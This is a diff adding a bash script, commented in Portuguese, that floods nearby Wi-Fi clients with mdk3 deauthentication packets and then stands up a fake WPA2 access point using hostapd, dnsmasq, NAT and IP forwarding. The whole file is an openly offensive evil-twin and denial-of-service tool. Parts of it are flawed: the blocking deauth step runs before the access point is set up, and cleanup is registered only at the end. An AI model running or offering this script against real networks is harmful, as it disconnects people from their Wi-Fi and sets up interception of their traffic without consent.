@@ -1,0 +1,100 @@
+#!/bin/bash
+
+# Função para verificar se o script está sendo executado com permissões de root
+check_root() {
+  if [ "$(id -u)" -ne 0 ]; then
+    echo "Este script precisa de permissões de root!"
+    exit 1
+  fi
+}
+
+# Função para verificar se todas as dependências estão instaladas
+check_dependencies() {
+  for cmd in hostapd dnsmasq mdk3 ifconfig iw iptables; do
+    command -v $cmd &>/dev/null || { echo "$cmd não encontrado. Instale usando 'pkg install $cmd'"; exit 1; }
+  done
+}
+
+# Função para obter a interface Wi-Fi disponível
+get_wifi_interface() {
+  INTERFACE=$(iw dev | grep Interface | awk '{print $2}')
+  if [ -z "$INTERFACE" ]; then
+    echo "Nenhuma interface Wi-Fi encontrada. Certifique-se de que o dispositivo tenha uma interface Wi-Fi disponível."
+    exit 1
+  fi
+  echo "Interface Wi-Fi encontrada: $INTERFACE"
+}
+
+# Função para configurar o canal automaticamente com base nas redes próximas
+set_channel() {
+  CHANNEL=$(iw dev $INTERFACE scan | grep "channel" | head -n 1 | awk '{print $2}')
+  echo "Usando canal $CHANNEL baseado nas redes próximas."
+}
+
+# Função para criar o ponto de acesso falso
+create_fake_ap() {
+  # Configurações do ponto de acesso
+  SSID="FakeAP"            # Nome da rede Wi-Fi (SSID)
+  PASSWORD="FakePassword"   # Senha do ponto de acesso
+  IP_RANGE="192.168.42.0/24"  # Faixa de IP para o DHCP
+  GATEWAY="192.168.42.1"      # IP do gateway (normalmente o IP do AP)
+  DNS="8.8.8.8"               # DNS (Google DNS)
+  
+  # Configurações de rede
+  echo "Configurando o ponto de acesso..."
+  ifconfig $INTERFACE down
+  iw dev $INTERFACE set type managed
+  ifconfig $INTERFACE up
+  
+  # Configura a interface de rede
+  iptables -t nat -A POSTROUTING -o $INTERFACE -j MASQUERADE
+  echo 1 > /proc/sys/net/ipv4/ip_forward
+  
+  # Configura o DHCP com dnsmasq
+  echo "interface=$INTERFACE
+  dhcp-range=192.168.42.10,192.168.42.100,12h
+  dhcp-option=3,$GATEWAY
+  dhcp-option=6,$DNS" > /etc/dnsmasq.conf
+  
+  # Configura o hostapd
+  echo "interface=$INTERFACE
+  driver=nl80211
+  ssid=$SSID
+  hw_mode=g
+  channel=$CHANNEL
+  wpa=2
+  wpa_passphrase=$PASSWORD
+  wpa_key_mgmt=WPA-PSK
+  rsn_pairwise=CCMP" > /etc/hostapd.conf
+  
+  # Inicia o dnsmasq e o hostapd
+  echo "Iniciando o ponto de acesso falso..."
+  dnsmasq
+  hostapd /etc/hostapd.conf
+}
+
+# Função para iniciar o ataque de deauthentication
+start_deauth_attack() {
+  # Desconecta os dispositivos da rede alvo
+  echo "Iniciando ataque de deauthentication..."
+  mdk3 $INTERFACE d -c $CHANNEL
+}
+
+# Função para limpar as configurações após o ataque
+cleanup() {
+  echo "Limpando configurações..."
+  killall hostapd dnsmasq mdk3
+  ip link set $INTERFACE down
+  echo 0 > /proc/sys/net/ipv4/ip_forward
+}
+
+# Inicia o script
+check_root
+check_dependencies
+get_wifi_interface
+set_channel
+start_deauth_attack
+create_fake_ap
+
+# Cleanup no final
+trap cleanup EXIT
